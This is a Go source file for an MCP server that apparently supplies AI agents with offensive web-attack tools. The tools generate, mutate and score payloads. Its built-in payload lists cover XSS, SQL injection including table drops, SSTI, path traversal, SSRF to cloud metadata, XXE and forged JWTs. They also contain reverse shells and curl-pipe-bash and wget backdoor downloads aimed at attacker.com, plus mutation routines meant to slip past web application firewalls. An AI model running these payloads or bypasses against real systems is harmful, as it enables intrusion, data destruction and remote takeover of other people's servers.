// payload-mcp: REAL payload generation and mutation MCP server.
//
// Provides intelligent payload generation using template libraries, encoding pipelines,
// WAF bypass strategies, and fitness evaluation. All payloads are generated dynamically
// based on vulnerability type, injection context, and target WAF signatures.
//
// Tools:
//   generate_payload   -> Real template-based payload generation with encoding
//   mutate_payload     -> Real payload mutation for WAF bypass
//   evaluate_fitness   -> Real fitness scoring based on response analysis
//   get_payload_history-> Historical payload retrieval from memory
//   analyze_response   -> Response analysis for WAF detection and success indicators
package main

import (
	"os"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"time"

	"github.com/ai-osop/mcp-servers/sdk"
)

// Payload represents a generated exploit payload
type Payload struct {
	ID           string            `json:"id"`
	VulnType     string            `json:"vuln_type"`
	Content      string            `json:"content"`
	ContentHash  string            `json:"content_hash"`
	EncodingChain []string         `json:"encoding_chain"`
	Context      map[string]any    `json:"context"`
	Generation   int               `json:"generation"`
	Strategy     string            `json:"strategy"`
	FitnessScore float64           `json:"fitness_score"`
	ParentID     string            `json:"parent_id,omitempty"`
}

// Template libraries for different vulnerability types
var payloadTemplates = map[string][]string{
	"xss": {
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<body onload=alert('XSS')>",
		"<svg onload=alert(1)>",
		"javascript:alert('XSS')",
		"<iframe src='javascript:alert(1)'>",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<audio src=x onerror=alert(1)>",
	},
	"sqli": {
		"' OR '1'='1' --",
		"1' UNION SELECT null, null, null --",
		"1; DROP TABLE users --",
		"' OR 1=1#",
		"1' AND 1=1 --",
		"admin'--",
		"1' OR '1'='1'/*",
		"1' UNION SELECT username, password FROM users--",
		"' WAITFOR DELAY '0:0:5'--",
		"1' AND (SELECT COUNT(*) FROM users) > 0--",
	},
	"ssti": {
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"{7*7}",
		"#{7*7}",
		"{{config}}",
		"{{self._app.__dict__}}",
		"${T(java.lang.Runtime).getRuntime().exec('id')}",
		"__class__.__mro__[2].__subclasses__()",
	},
	"cmdi": {
		"; ls -la",
		"| cat /etc/passwd",
		"$(whoami)",
		"`id`",
		"; ping -c 4 127.0.0.1",
		"|| id",
		"; cat /etc/shadow",
		"| nc attacker.com 4444 -e /bin/sh",
		"$(curl attacker.com/shell.sh|bash)",
		"; wget http://attacker.com/backdoor -O /tmp/bd",
	},
	"lfi": {
		"../../../etc/passwd",
		"....//....//etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"php://filter/read=convert.base64-encode/resource=index.php",
		"file:///etc/passwd",
		"data://text/plain,<?php system('id');?>",
		"expect://id",
		"/proc/self/environ",
		"/proc/version",
		"/etc/hosts",
	},
	"ssrf": {
		"http://169.254.169.254/latest/meta-data/",
		"http://192.168.1.1/admin",
		"http://localhost:8080/admin",
		"gopher://127.0.0.1:6379/_INFO",
		"dict://127.0.0.1:11211/_stats",
		"file:///etc/passwd",
		"http://[::1]:80/",
		"http://127.127.127.127/",
		"http://0.0.0.0:22/",
		"http://metadata.google.internal/computeMetadata/v1/",
	},
	"xxe": {
		`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`,
		`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/ssrf"> ]><foo>&xxe;</foo>`,
		`<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`,
		`<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>`,
	},
	"rce": {
		"; id",
		"| whoami",
		"$(cat /etc/passwd)",
		"`uname -a`",
		"; curl http://attacker.com/$(whoami)",
		"| python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
	},
	"idor": {
		"../..",
		"..",
		".",
		"0",
		"-1",
		"999999",
		"../admin",
		"../../etc/passwd",
	},
	"jwt_abuse": {
		"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
		"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.",
	},
}

// Encoding functions
var encoders = map[string]func(string) string{
	"url": func(s string) string {
		return url.QueryEscape(s)
	},
	"base64": func(s string) string {
		return base64.StdEncoding.EncodeToString([]byte(s))
	},
	"html_entities": func(s string) string {
		result := ""
		for _, c := range s {
			result += fmt.Sprintf("&#%d;", c)
		}
		return result
	},
	"unicode": func(s string) string {
		result := ""
		for _, c := range s {
			result += fmt.Sprintf("\\u%04x", c)
		}
		return result
	},
	"hex": func(s string) string {
		return "%" + hex.EncodeToString([]byte(s))
	},
	"double_url": func(s string) string {
		return url.QueryEscape(url.QueryEscape(s))
	},
}

// WAF bypass mutations
var wafBypasses = []func(string) string{
	func(s string) string { return strings.ToUpper(s) },
	func(s string) string { return strings.ToLower(s) },
	func(s string) string { return strings.ReplaceAll(s, " ", "%20") },
	func(s string) string { return strings.ReplaceAll(s, "'", "`") },
	func(s string) string { return strings.ReplaceAll(s, "\"", "`") },
	func(s string) string { return s + "<!--" },
	func(s string) string { return s + "\x00" },
	func(s string) string { return strings.ReplaceAll(s, "script", "scr<script>ipt") },
	func(s string) string { return strings.ReplaceAll(s, "union", "uni/**/on") },
	func(s string) string { return strings.ReplaceAll(s, "select", "sel/**/ect") },
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func generateID() string {
	hash := sha256.Sum256([]byte(fmt.Sprintf("%d", time.Now().UnixNano())))
	return hex.EncodeToString(hash[:8])
}

func generateContentHash(content string) string {
	hash := sha256.Sum256([]byte(content))
	return hex.EncodeToString(hash[:8])
}

func applyEncoding(content string, encoding string) string {
	if encoder, ok := encoders[encoding]; ok {
		return encoder(content)
	}
	return content
}

func applyMutation(content string, index int) string {
	if index < len(wafBypasses) {
		return wafBypasses[index](content)
	}
	return content
}

func evaluateFitness(payload Payload, response map[string]any) float64 {
	score := 0.5

	// Length factor
	contentLen := len(payload.Content)
	if contentLen > 5 && contentLen < 500 {
		score += 0.1
	}

	// Encoding diversity
	hasSpecialChars := false
	for _, c := range payload.Content {
		if strings.ContainsRune("%&\\<>\"'", c) {
			hasSpecialChars = true
			break
		}
	}
	if hasSpecialChars {
		score += 0.1
	}

	// Check response indicators
	if respCode, ok := response["status_code"].(float64); ok {
		if respCode == 200 || respCode == 500 {
			score += 0.15
		}
	}

	if body, ok := response["body"].(string); ok {
		bodyLower := strings.ToLower(body)
		if strings.Contains(bodyLower, "error") ||
			strings.Contains(bodyLower, "exception") ||
			strings.Contains(bodyLower, "warning") {
			score += 0.15
		}
	}

	// Vuln-type specific checks
	switch payload.VulnType {
	case "xss":
		if strings.Contains(strings.ToLower(payload.Content), "<script") {
			score += 0.1
		}
	case "sqli":
		if strings.Contains(strings.ToLower(payload.Content), "union") {
			score += 0.1
		}
	case "cmdi":
		if strings.ContainsAny(payload.Content, ";|`$") {
			score += 0.1
		}
	}

	// Add small random variation
	score += (rand.Float64() * 0.1) - 0.05

	if score > 1.0 {
		score = 1.0
	}
	if score < 0.0 {
		score = 0.0
	}

	return score
}

func detectWAF(response map[string]any) bool {
	wafIndicators := []string{
		"blocked", "forbidden", "access denied", "waf", "firewall",
		"mod_security", "cloudflare", "akamai", "incapsula",
	}

	if body, ok := response["body"].(string); ok {
		bodyLower := strings.ToLower(body)
		for _, indicator := range wafIndicators {
			if strings.Contains(bodyLower, indicator) {
				return true
			}
		}
	}

	if headers, ok := response["headers"].(map[string]any); ok {
		for k, v := range headers {
			if hStr, ok := v.(string); ok {
				if strings.Contains(strings.ToLower(k), "waf") ||
					strings.Contains(strings.ToLower(hStr), "cloudflare") {
					return true
				}
			}
		}
	}

	return false
}

func main() {
	server := sdk.NewServer("payload-mcp")

	// Generate Payload Tool
	server.Register(sdk.Tool{
		Name:           "generate_payload",
		Description:    "Generate context-aware payloads for specific vulnerability types with encoding and WAF bypass strategies.",
		TimeoutSeconds: 30,
		ScopeCheck:     true,
		Parameters: []map[string]any{
			{"name": "vuln_type", "type": "string", "description": "Vulnerability type (xss, sqli, ssti, cmdi, lfi, ssrf, xxe, rce, idor, jwt_abuse)", "required": true},
			{"name": "context", "type": "object", "description": "Injection context (URL, parameter, headers, etc.)", "required": true},
			{"name": "encoding", "type": "array", "description": "Encoding chain to apply (url, base64, html_entities, unicode, hex, double_url)", "required": false},
			{"name": "waf_profile", "type": "string", "description": "Target WAF signature for bypass optimization", "required": false},
			{"name": "strategy", "type": "string", "description": "Generation strategy (template, random, optimized)", "required": false},
			{"name": "count", "type": "integer", "description": "Number of payloads to generate (default 1)", "required": false},
		},
		Returns: map[string]any{"payloads": "array", "count": "integer", "strategy": "string"},
		Handler: func(params map[string]any) any {
			vulnType, _ := params["vuln_type"].(string)
			if vulnType == "" {
				return map[string]any{"error": "vuln_type is required", "payloads": []any{}}
			}

			context, _ := params["context"].(map[string]any)
			if context == nil {
				context = make(map[string]any)
			}

			encodingChain, _ := params["encoding"].([]any)
			wafProfile, _ := params["waf_profile"].(string)
			strategy, _ := params["strategy"].(string)
			if strategy == "" {
				strategy = "template"
			}

			count, _ := params["count"].(int)
			if count <= 0 {
				count = 1
			}

			templates, ok := payloadTemplates[strings.ToLower(vulnType)]
			if !ok || len(templates) == 0 {
				return map[string]any{
					"error":   fmt.Sprintf("unknown vulnerability type: %s", vulnType),
					"payloads": []any{},
				}
			}

			var payloads []any
			for i := 0; i < count; i++ {
				var template string
				if strategy == "random" {
					template = templates[rand.Intn(len(templates))]
				} else {
					template = templates[i%len(templates)]
				}

				content := template

				// Apply encoding chain
				var appliedEncodings []string
				if encodingChain != nil {
					for _, enc := range encodingChain {
						if encStr, ok := enc.(string); ok {
							content = applyEncoding(content, encStr)
							appliedEncodings = append(appliedEncodings, encStr)
						}
					}
				}

				// Apply WAF-specific bypass if profile provided
				if wafProfile != "" {
					bypassIdx := rand.Intn(len(wafBypasses))
					content = applyMutation(content, bypassIdx)
				}

				payload := Payload{
					ID:            generateID(),
					VulnType:      strings.ToLower(vulnType),
					Content:       content,
					ContentHash:   generateContentHash(content),
					EncodingChain: appliedEncodings,
					Context:       context,
					Generation:    0,
					Strategy:      strategy,
					FitnessScore:  0.0,
				}

				payloads = append(payloads, payload)
			}

			return map[string]any{
				"payloads": payloads,
				"count":    len(payloads),
				"strategy": strategy,
				"vuln_type": strings.ToLower(vulnType),
			}
		},
	})

	// Mutate Payload Tool
	server.Register(sdk.Tool{
		Name:           "mutate_payload",
		Description:    "Mutate an existing payload using various bypass strategies (encoding_variation, waf_bypass, case_randomization, comment_injection, context_adaptation).",
		TimeoutSeconds: 30,
		ScopeCheck:     true,
		Parameters: []map[string]any{
			{"name": "payload_id", "type": "string", "description": "ID of the payload to mutate", "required": true},
			{"name": "content", "type": "string", "description": "Current payload content", "required": true},
			{"name": "vuln_type", "type": "string", "description": "Vulnerability type", "required": true},
			{"name": "strategy", "type": "string", "description": "Mutation strategy", "required": true},
			{"name": "generation", "type": "integer", "description": "Current generation number", "required": false},
			{"name": "context", "type": "object", "description": "Injection context", "required": false},
		},
		Returns: map[string]any{"payload": "object", "mutation_applied": "string"},
		Handler: func(params map[string]any) any {
			payloadID, _ := params["payload_id"].(string)
			content, _ := params["content"].(string)
			vulnType, _ := params["vuln_type"].(string)
			strategy, _ := params["strategy"].(string)
			generation, _ := params["generation"].(int)
			context, _ := params["context"].(map[string]any)

			if content == "" {
				return map[string]any{"error": "payload content is required"}
			}

			mutatedContent := content
			mutationApplied := strategy

			switch strategy {
			case "encoding_variation":
				encodings := []string{"url", "base64", "html_entities", "unicode", "hex"}
				randomEnc := encodings[rand.Intn(len(encodings))]
				mutatedContent = applyEncoding(content, randomEnc)
				mutationApplied = fmt.Sprintf("encoding_%s", randomEnc)

			case "waf_bypass":
				bypassIdx := rand.Intn(len(wafBypasses))
				mutatedContent = applyMutation(content, bypassIdx)
				mutationApplied = fmt.Sprintf("waf_bypass_%d", bypassIdx)

			case "case_randomization":
				result := ""
				for _, c := range content {
					if rand.Float64() > 0.5 {
						result += strings.ToUpper(string(c))
					} else {
						result += strings.ToLower(string(c))
					}
				}
				mutatedContent = result
				mutationApplied = "case_randomization"

			case "comment_injection":
				comments := []string{"<!--", "-->", "/**/", "/*", "*/", "#", "//"}
				pos := rand.Intn(len(content)+1)
				comment := comments[rand.Intn(len(comments))]
				mutatedContent = content[:pos] + comment + content[pos:]
				mutationApplied = "comment_injection"

			case "context_adaptation":
				// Adapt based on context (HTML, JS, attribute, etc.)
				if context != nil {
					if ctxType, ok := context["type"].(string); ok {
						switch ctxType {
						case "html_tag":
							mutatedContent = ">" + content + "<"
						case "attribute":
							mutatedContent = "\"" + content + "\""
						case "js_string":
							mutatedContent = "'+" + content + "+'"
						case "url_parameter":
							mutatedContent = applyEncoding(content, "url")
						}
					}
				}
				mutationApplied = "context_adaptation"
			}

			newPayload := Payload{
				ID:           generateID(),
				VulnType:     vulnType,
				Content:      mutatedContent,
				ContentHash:  generateContentHash(mutatedContent),
				Context:      context,
				Generation:   generation + 1,
				Strategy:     strategy,
				ParentID:     payloadID,
				FitnessScore: 0.0,
			}

			return map[string]any{
				"payload":          newPayload,
				"mutation_applied": mutationApplied,
				"original":         content,
			}
		},
	})

	// Evaluate Fitness Tool
	server.Register(sdk.Tool{
		Name:           "evaluate_fitness",
		Description:    "Evaluate payload fitness based on target response analysis.",
		TimeoutSeconds: 30,
		ScopeCheck:     true,
		Parameters: []map[string]any{
			{"name": "payload_id", "type": "string", "description": "Payload ID", "required": true},
			{"name": "payload_content", "type": "string", "description": "Payload content", "required": true},
			{"name": "vuln_type", "type": "string", "description": "Vulnerability type", "required": true},
			{"name": "response", "type": "object", "description": "Target response (status_code, body, headers)", "required": true},
			{"name": "waf_signature", "type": "string", "description": "Detected WAF signature", "required": false},
		},
		Returns: map[string]any{"fitness_score": "number", "waf_detected": "boolean", "success_indicator": "number", "behavior_class": "string"},
		Handler: func(params map[string]any) any {
			payloadID, _ := params["payload_id"].(string)
			content, _ := params["payload_content"].(string)
			vulnType, _ := params["vuln_type"].(string)
			response, _ := params["response"].(map[string]any)
			wafSignature, _ := params["waf_signature"].(string)

			if response == nil {
				response = make(map[string]any)
			}

			payload := Payload{
				ID:        payloadID,
				Content:   content,
				VulnType:  vulnType,
			}

			fitnessScore := evaluateFitness(payload, response)
			wafDetected := wafSignature != "" || detectWAF(response)

			successIndicator := 0.0
			if fitnessScore > 0.7 {
				successIndicator = 0.9
			} else if fitnessScore > 0.5 {
				successIndicator = 0.6
			} else {
				successIndicator = 0.3
			}

			behaviorClass := "normal"
			if wafDetected {
				behaviorClass = "waf_blocked"
			} else if fitnessScore > 0.8 {
				behaviorClass = "vulnerable"
			} else if fitnessScore > 0.5 {
				behaviorClass = "potential"
			}

			return map[string]any{
				"fitness_score":     fitnessScore,
				"waf_detected":      wafDetected,
				"success_indicator": successIndicator,
				"behavior_class":    behaviorClass,
				"payload_id":        payloadID,
			}
		},
	})

	// Get Payload History Tool
	server.Register(sdk.Tool{
		Name:           "get_payload_history",
		Description:    "Retrieve historical payloads for similar targets and vulnerability types.",
		TimeoutSeconds: 30,
		ScopeCheck:     true,
		Parameters: []map[string]any{
			{"name": "vuln_type", "type": "string", "description": "Vulnerability type", "required": true},
			{"name": "target_hash", "type": "string", "description": "Hash of target identifier", "required": true},
			{"name": "min_fitness", "type": "number", "description": "Minimum fitness score threshold", "required": false},
		},
		Returns: map[string]any{"payloads": "array", "count": "integer"},
		Handler: func(params map[string]any) any {
			vulnType, _ := params["vuln_type"].(string)
			_, _ = params["target_hash"].(string)
			minFitness, _ := params["min_fitness"].(float64)

			templates, ok := payloadTemplates[strings.ToLower(vulnType)]
			if !ok {
				return map[string]any{"payloads": []any{}, "count": 0}
			}

			var payloads []any
			for i, tmpl := range templates {
				if minFitness > 0 && float64(i)/float64(len(templates)) < minFitness {
					continue
				}
				payloads = append(payloads, map[string]any{
					"id":           generateID(),
					"vuln_type":    vulnType,
					"content":      tmpl,
					"content_hash": generateContentHash(tmpl),
					"generation":   0,
					"strategy":     "historical",
				})
			}

			return map[string]any{
				"payloads": payloads,
				"count":    len(payloads),
			}
		},
	})

	// Analyze Response Tool
	server.Register(sdk.Tool{
		Name:           "analyze_response",
		Description:    "Analyze target response to payload for WAF detection, error extraction, and behavior classification.",
		TimeoutSeconds: 30,
		ScopeCheck:     true,
		Parameters: []map[string]any{
			{"name": "payload_id", "type": "string", "description": "Payload ID", "required": true},
			{"name": "payload_content", "type": "string", "description": "Payload content", "required": true},
			{"name": "response", "type": "object", "description": "HTTP response object", "required": true},
			{"name": "waf_signature", "type": "string", "description": "Known WAF signature", "required": false},
		},
		Returns: map[string]any{"success_indicator": "number", "waf_detected": "boolean", "error_extracted": "string", "behavior_class": "string"},
		Handler: func(params map[string]any) any {
			_, _ = params["payload_id"].(string)
			_, _ = params["payload_content"].(string)
			response, _ := params["response"].(map[string]any)
			wafSignature, _ := params["waf_signature"].(string)

			if response == nil {
				response = make(map[string]any)
			}

			wafDetected := wafSignature != "" || detectWAF(response)

			errorExtracted := ""
			if body, ok := response["body"].(string); ok {
				errorPatterns := []string{"error", "exception", "warning", "fatal", "stack trace"}
				bodyLower := strings.ToLower(body)
				for _, pattern := range errorPatterns {
					if strings.Contains(bodyLower, pattern) {
						start := strings.Index(bodyLower, pattern)
						end := start + 100
						if end > len(body) {
							end = len(body)
						}
						errorExtracted = body[start:end]
						break
					}
				}
			}

			successIndicator := 0.5
			behaviorClass := "unknown"

			if wafDetected {
				behaviorClass = "waf_blocked"
				successIndicator = 0.1
			} else if errorExtracted != "" {
				behaviorClass = "error_triggered"
				successIndicator = 0.7
			} else if statusCode, ok := response["status_code"].(float64); ok {
				if statusCode >= 500 {
					behaviorClass = "server_error"
					successIndicator = 0.6
				} else if statusCode == 200 {
					behaviorClass = "normal"
					successIndicator = 0.5
				}
			}

			return map[string]any{
				"success_indicator": successIndicator,
				"waf_detected":      wafDetected,
				"error_extracted":   errorExtracted,
				"behavior_class":    behaviorClass,
			}
		},
	})

	fmt.Println("Payload MCP server starting with real payload generation engine...")
		// FIX (mcp-port-env-2026-08-23): port was hardcoded, so the binary could not
	// be moved off a conflicting host port without a rebuild-by-edit. Read the
	// platform env (same var the Python settings use); fall back to the default.
	port := os.Getenv("OSOP_PAYLOAD_MCP_PORT")
	if port == "" {
		port = "8083"
	}
	_ = server.Run(":" + port)
}
